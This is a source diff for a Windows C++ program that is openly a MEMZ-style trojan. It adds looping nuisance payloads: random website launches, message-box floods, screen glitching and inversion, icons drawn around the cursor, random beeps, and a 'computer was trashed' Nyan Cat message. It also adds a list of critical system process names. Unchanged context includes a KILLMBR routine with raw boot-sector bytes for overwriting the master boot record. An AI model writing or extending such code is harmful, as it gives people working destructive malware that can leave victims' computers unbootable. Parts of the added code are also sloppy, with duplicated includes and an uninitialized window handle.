@@ -1,5 +1,8 @@
-#include <tchar.h>
 #include <windows.h>
+#include <shellapi.h>
+#include <werapi.h> 
+#include <winable.h>
+#include <tchar.h>
 #include <stdlib.h>
 #include <time.h>
 #include <vector>
@@ -7,13 +10,47 @@
 #include <string>
 #include <pthread.h>
 #include <iostream> 
+#include <dirent.h>
+#include <Mmsystem.h>
+#include <math.h>
+#include <cmath>
+#include <bits/stdc++.h>
+#include <string>
+#include <random>
+#include <regex>
+#include <string>
+#include <dirent.h>
+#include <iostream>
+
+#pragma once
 
 #define random_in(a,b) (rand()%(b-a)+a) 
+#define random_list(x) (rand()%x)
 #define DESKTOP_WINDOW ((HWND)0)
+#define PI 3.1415926
 
+using namespace std;
+LPCWSTR lpPaths[13] = {
+	L"explorer.exe",
+	L"taskmgr.exe",
+	L"winlogon.exe",
+	L"csrss.exe",
+	L"dwm.exe",
+	L"cmd.exe",
+	L"svchost.exe",
+	L"conhost.exe",
+	L"smss.exe",
+	L"wininit.exe",
+	L"werfault.exe",
+	L"winver.exe",
+	L"regedit.exe" 
+	
+};
+
+HCRYPTPROV prov;
 int scrw = GetSystemMetrics(SM_CXSCREEN);
 int scrh = GetSystemMetrics(SM_CYSCREEN);
-
+HWND hwnd;
 int times = 0;
 
 const char *sounds[] = {
@@ -26,6 +63,7 @@ const char *sounds[] = {
 };
 
 const size_t nSounds = sizeof(sounds) / sizeof(void *);
+
 
 const unsigned char code1[] = {
 	0xBB, 0xE0, 0x07, 0x8E, 0xC3, 0x8E, 0xDB, 0xB8, 0x04, 0x02, 0xB9, 0x02,
@@ -225,7 +263,9 @@ const unsigned char code2[] = {
 const size_t code1_len = sizeof(code1);
 const size_t code2_len = sizeof(code2);
 
-
+void disable_redraw(){
+	SendMessage(hwnd, WM_SETREDRAW, FALSE, 0L);
+}
 void randClick(){
 	INPUT input;
 	input.type = INPUT_KEYBOARD;
@@ -294,7 +334,12 @@ void payloadExecute() {
 	ShellExecuteA(NULL, "open", (LPCSTR)sites[rand() % nSites], NULL, NULL, SW_SHOWDEFAULT);
 }
 
-
+void randomExecute(){
+	for(;;){
+		payloadExecute();
+		Sleep(random_in(8000,25000));
+	}
+}
 void strReverseW(LPWSTR str) {
 	int len = lstrlenW(str);
 
@@ -376,7 +421,6 @@ void RandIcon(){
 	int cy = GetSystemMetrics(SM_CYFULLSCREEN);
 	HWND hwnd = GetDesktopWindow();
 	HDC hdc = GetWindowDC(hwnd);
-	POINT point;
 	DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_QUESTION));
 	DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_WARNING));
 	DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_ERROR));
@@ -413,13 +457,28 @@ void KILLMBR(){
 
 }
 
+string rand_str(const int len)  /*参数为字符串的长度*/
+{
+    /*初始化*/
+    string str;                 /*声明用来保存随机字符串的str*/
+    char c;                     /*声明字符c，用来保存随机生成的字符*/
+    int idx;                    /*用来循环的变量*/
+    /*循环向字符串中添加随机生成的字符*/
+    for(idx = 0;idx < len;idx ++)
+    {
+        /*rand()%26是取余，余数为0~25加上'a',就是字母a~z,详见asc码表*/
+        c = 'a' + rand()%26;
+        str.push_back(c);       /*push_back()是string类尾插函数。这里插入随机字符c*/
+    }
+    return str;                 /*返回生成的随机字符串*/
+}
+
+
 LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode == HCBT_CREATEWND) {
 		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;
 
 		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
-			HWND hwnd = (HWND)wParam;
-
 			int x = rand() % (scrw - pcs->cx);
 			int y = rand() % (scrh - pcs->cy);
 
@@ -446,8 +505,7 @@ int tunnel() {
 	GetWindowRect(hwnd, &rekt);
 	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
 	ReleaseDC(hwnd, hdc);
-
-	out: return 200.0 / (times / 5.0 + 1) + 4;
+	return 200.0 / (times / 5.0 + 1) + 4;
 }
 
 void inftunnel(){
@@ -475,7 +533,7 @@ int DrawErrors() {
 	
 	ReleaseDC(hwnd, hdc);
 
-	out: return 2;
+	return 2;
 }
 
 void randomDraw(){
@@ -486,7 +544,7 @@ void randomDraw(){
 
 int payloadSound() {
 	PlaySoundA(sounds[rand() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
-	out: return 20 + (rand() % 20);
+	return 20 + (rand() % 20);
 }
 
 void infplay(){
@@ -504,7 +562,7 @@ int payloadBlink() {
 	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
 	ReleaseDC(hwnd, hdc);
 
-	out: return 100;
+	return 100;
 }
 
 void infBlink(){
@@ -579,31 +637,129 @@ void infShock(){
 		Shake();
 	}
 }
-void SetConsoleRoundCorners(int width, int height, int radius)
-{
-    // 获取当前控制台窗口句柄
-    HWND hwndConsole = GetConsoleWindow();
+void iconAura(){
+	int x,y,dx,dy,angle,i;
+	double xx,yy;
+	POINT cp;
+    HWND hwnd = GetDesktopWindow();
+    HDC hdc = GetWindowDC(hwnd);
+         //寄存器//
+	HWND hWnd;
+    SendMessage(hWnd, WM_SETREDRAW, FALSE, 0L);
+	
+	while(true)
+	{
+		for (i = 0; i <= 45; i++){
+			GetCursorPos(&cp);
+			x = cp.x-80, y = cp.y-80;
+			dx = cp.x, dy = cp.y;
+			angle = -2 * i;
+			xx = (x - dx)*cos(angle * PI / 45) - (y-dy)*sin(angle * PI / 45) + dx;//计算+ 
+			yy = (y-dy)*cos(angle * PI / 45) + (x-dx)*sin(angle * PI / 45) + dy;//计算 
+			
+			DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_QUESTION));
+			DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_WARNING));
+			DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_ERROR));
+			x = cp.x+80, y = cp.y+80;
+			dx = cp.x, dy = cp.y;
+			angle = -2 * i;
+			xx = (x - dx)*cos(angle * PI / 45) - (y-dy)*sin(angle * PI / 45) + dx;//计算-
+			yy = (y-dy)*cos(angle * PI / 45) + (x-dx)*sin(angle * PI / 45) + dy;//计算 
+			DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_INFORMATION));
+			DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_WINLOGO));
+			//Sleep(25);
+		}	
+	}
+}
+void randomSeed(){
+	for(;;){
+		srand((int)time(0));
+		Sleep(300);
+	}
+}
 
-    // 获取客户区域坐标
-    RECT rect;
-    GetClientRect(hwndConsole, &rect);
+int random() {
+	if (prov == '\0')
+		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
+			ExitProcess(1);
 
-    // 将坐标转换为屏幕坐标
-    POINT p1 = { rect.left, rect.top };
-    POINT p2 = { rect.right, rect.bottom };
-    ClientToScreen(hwndConsole, &p1);
-    ClientToScreen(hwndConsole, &p2);
-    rect.left = p1.x;
-    rect.top = p1.y;
-    rect.right = p2.x;
-    rect.bottom = p2.y;
+	int out;
+	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
+	return out & 0x7fffffff;
+}
 
-    // 创建圆角区域
-    HRGN hRgn = CreateRoundRectRgn(rect.left, rect.top, rect.right, rect.bottom, radius, radius);
+int payloadMessageBox() {
+	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
+	return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
+}
 
-    // 设置圆角区域
-    SetWindowRgn(hwndConsole, hRgn, TRUE);
+int glitch() {	
+	HWND hwnd = GetDesktopWindow();
+	HDC hdc = GetWindowDC(hwnd);
+	RECT rekt;
+	GetWindowRect(hwnd, &rekt);
 
-    // 释放资源
-    DeleteObject(hRgn);
+	int x1 = random() % (rekt.right - 100);
+	int y1 = random() % (rekt.bottom - 100);
+	int x2 = random() % (rekt.right - 100);
+	int y2 = random() % (rekt.bottom - 100);
+	int width = random() % 600;
+	int height = random() % 600;
+
+	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
+	ReleaseDC(hwnd, hdc);
+
+	return 200.0 / (times / 5.0 + 1) + 3;
+}
+
+void infglitch(){
+	for(;;){
+		glitch();
+		Sleep(1500);
+	}
+}
+void sayNyan(){ // Decompile By NyanConsole! (I Think This Code Need Optimize...)
+	const CHAR *v1; // ebx
+	HMODULE ModuleHandleA; // eax
+	HANDLE ImageA; // eax
+	HANDLE StdHandle; // eax
+	HANDLE h[12]; // [esp+5Ch] [ebp-6Ch]
+	int v15; // [esp+A0h] [ebp-28h]
+	LPCSTR lpString; // [esp+A4h] [ebp-24h]
+	int i; // [esp+B4h] [ebp-14h]
+	int v21; // [esp+B8h] [ebp-10h]
+	int v22; // [esp+BCh] [ebp-Ch]
+
+	v22 = 10000;
+	v21 = 0;
+	while ( v22 <= 10011 )
+	{
+		v1 = (const CHAR *)(unsigned __int16)v22;
+		ModuleHandleA = GetModuleHandleA(0);
+		ImageA = LoadImageA(ModuleHandleA, v1, 0, 0, 0, 0x2040u);
+		h[v21] = ImageA;
+		++v22;
+		++v21;
+	}
+	lpString = "Your computer was trashed by the MEMZ Trojan. Now enjoy the Nyan Cat...";
+	v15 = lstrlenA("Your computer was trashed by the MEMZ Trojan. Now enjoy the Nyan Cat...");
+	for ( i = 0; i < v15; ++i )
+	{
+		StdHandle = GetStdHandle(0xFFFFFFF5);
+		SetConsoleTextAttribute(StdHandle, 0x800Fu);
+		putchar(lpString[i]);
+		Sleep(0x32u);
+	}
+}
+
+void randomOutput(){
+	for(;;){
+		printf("%s",rand_str(random_in(5,50)).c_str());
+	}
+}
+void rand_beep(){
+	for(;;){
+		Beep(random_in(20,20000), random_in(2,500));
+		Sleep(random_in(200,1500));
+	}
 }
